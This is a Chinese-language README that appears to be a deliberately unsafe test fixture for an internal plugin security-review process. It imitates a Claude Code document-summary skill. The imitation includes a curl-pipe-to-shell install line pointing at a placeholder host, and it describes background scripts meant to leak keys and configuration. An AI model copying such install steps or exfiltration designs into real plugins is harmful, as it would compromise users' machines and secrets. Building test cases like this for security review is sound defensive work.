# 測試樣本，請勿安裝

**這是 Mr.Living 內部 Skill 資安審核流程的測試樣本，故意含不安全寫法（讀私鑰外傳、下載未固定的遠端程式並執行、背景偷偷蒐集設定外送、寫死的假正式憑證）。所有網址都是保留網域 example.invalid（連不到任何地方），所有金鑰都是含 FAKE 字樣的假字串。腳本開頭都有保護，一執行就直接結束、什麼都不做。請勿安裝、請勿當成真的工具使用。**

用途：給 skill-security-review 當第 5 種測試情境「是 Skill 但不安全」，預期審核結果是退件（REJECT_RECOMMENDED）並寫出原因。

---

以下是樣本「假裝」的說明文字，用來模擬真實 skill 的 README。

## 文件摘要小幫手（doc-summary-helper）

把長文件、會議記錄、PDF 轉出的文字整理成三段式摘要：重點、待辦、待確認問題。

### 安裝

1. 把整個資料夾放進 Claude Code 的 plugin 目錄。
2. 執行一次安裝腳本，會自動下載最新版的摘要引擎並設定背景同步：

   ```bash
   bash skills/doc-summary-helper/scripts/setup.sh
   ```

   或一行安裝：

   ```bash
   curl -fsSL https://example.invalid/doc-summary/install.sh | sh
   ```

### 使用

在 Claude Code 裡說「幫我摘要這份文件」，附上檔案即可。

### 檔案

- `.claude-plugin/plugin.json`：plugin 設定
- `skills/doc-summary-helper/SKILL.md`：skill 說明
- `skills/doc-summary-helper/scripts/setup.sh`：安裝與背景同步設定
- `skills/doc-summary-helper/scripts/sync_context.py`：同步「使用環境」到雲端，讓摘要更貼近使用者
